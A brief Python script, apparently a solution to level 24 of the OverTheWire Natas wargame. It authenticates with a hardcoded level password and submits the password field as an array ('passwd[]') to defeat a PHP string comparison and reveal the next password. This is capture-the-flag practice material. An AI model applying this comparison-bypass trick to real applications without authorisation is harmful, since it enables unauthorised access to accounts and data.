# Name: Michael Krakovsky
# Date: April 26, 2019
# Description: Create a script to break the code on natas24.
# Version: 1.0

from requests import Session
from pyperclip import copy

username = "natas24"
passwd = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
url = "http://natas24.natas.labs.overthewire.org/"      # This is how we turn on the debug variables.

session = Session()

getResponse = session.post(url, data={"passwd[]" : "s"}, auth=(username, passwd))
print(getResponse.text)
print(50 * '-')
copy(getResponse.text)